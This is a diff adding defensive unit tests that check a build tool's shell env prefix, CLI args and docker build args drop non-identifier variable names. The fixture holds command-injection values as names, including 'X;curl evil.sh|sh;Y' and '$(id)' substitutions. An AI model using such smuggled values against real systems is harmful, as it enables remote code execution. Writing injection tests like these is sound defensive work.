@@ -85,6 +85,43 @@ describe('buildPackDockerBuildArgs', () => {
   });
 });
 
+describe('variable names that are not identifiers', () => {
+  // buildPackEnvPrefix emits shell assignment prefixes, where the name cannot be
+  // quoted the way the value can — so such names must never reach the command.
+  const hostile = {
+    'X;curl evil.sh|sh;Y': 'v',
+    'FOO BAR': 'v',
+    'FOO$(id)': 'v',
+    'FOO`id`': 'v',
+    '1FOO': 'v',
+    GOOD_KEY: 'kept',
+  };
+
+  it('drops them from the shell env prefix and keeps the valid ones', () => {
+    const prefix = buildPackEnvPrefix({}, hostile);
+
+    expect(prefix).toContain(`GOOD_KEY='kept'`);
+    for (const bad of ['curl', 'FOO BAR', '$(id)', '`id`', '1FOO']) {
+      expect(prefix, bad).not.toContain(bad);
+    }
+  });
+
+  it("leaves the prefix as nothing but NAME='value' pairs", () => {
+    // Safe to split on spaces: no value in the fixture contains one.
+    const prefix = buildPackEnvPrefix({}, hostile);
+
+    for (const assignment of prefix.split(' ')) {
+      expect(assignment).toMatch(/^[A-Za-z_][A-Za-z0-9_]*='[^']*'$/);
+    }
+  });
+
+  it('drops them from the CLI and docker build args too', () => {
+    expect(buildPackCliEnvArgs({}, hostile)).not.toContain('curl');
+    expect(buildPackDockerBuildArgs({}, hostile)).not.toContain('curl');
+    expect(buildPackDockerBuildArgs({}, hostile)).toContain(`--build-arg 'GOOD_KEY=kept'`);
+  });
+});
+
 describe('resolveNodeBuildVersion', () => {
   it('defaults to the current LTS major', () => {
     expect(resolveNodeBuildVersion({})).toBe(DEFAULT_NODE_BUILD_VERSION);
